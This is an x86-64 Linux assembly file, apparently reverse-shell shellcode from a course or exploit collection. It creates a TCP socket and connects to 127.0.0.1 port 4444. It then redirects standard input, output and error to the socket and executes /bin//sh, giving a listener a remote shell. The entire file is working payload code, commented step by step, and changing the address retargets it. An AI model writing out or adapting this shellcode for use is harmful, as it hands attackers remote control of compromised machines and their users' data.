global _start


_start:

	; sock = socket(AF_INET, SOCK_STREAM, 0)
	; AF_INET = 2
	; SOCK_STREAM = 1
	; syscall number 41 


	mov rax, 41
	mov rdi, 2
	mov rsi, 1
	mov rdx, 0
	syscall

	; copy socket descriptor to rdi for future use 

	mov rdi, rax


	; server.sin_family = AF_INET 
	; server.sin_port = htons(PORT)
	; server.sin_addr.s_addr = inet_addr("127.0.0.1")
	; bzero(&server.sin_zero, 8)

	xor rax, rax 

	push rax
	
	mov dword [rsp-4], 0x0100007f
	mov word [rsp-6], 0x5c11
	mov word [rsp-8], 0x2
	sub rsp, 8


	; connect(sock, (struct sockaddr *)&server, sockaddr_len)
	
	mov rax, 42
	mov rsi, rsp
	mov rdx, 16
	syscall


        ; duplicate sockets

        ; dup2 (new, old)
        
	mov rax, 33
        mov rsi, 0
        syscall

        mov rax, 33
        mov rsi, 1
        syscall

        mov rax, 33
        mov rsi, 2
        syscall



        ; execve

        ; First NULL push

        xor rax, rax
        push rax

        ; push /bin//sh in reverse

        mov rbx, 0x68732f2f6e69622f
        push rbx

        ; store /bin//sh address in RDI

        mov rdi, rsp

        ; Second NULL push
        push rax

        ; set RDX
        mov rdx, rsp


        ; Push address of /bin//sh
        push rdi

        ; set RSI

        mov rsi, rsp

        ; Call the Execve syscall
        add rax, 59
        syscall
 
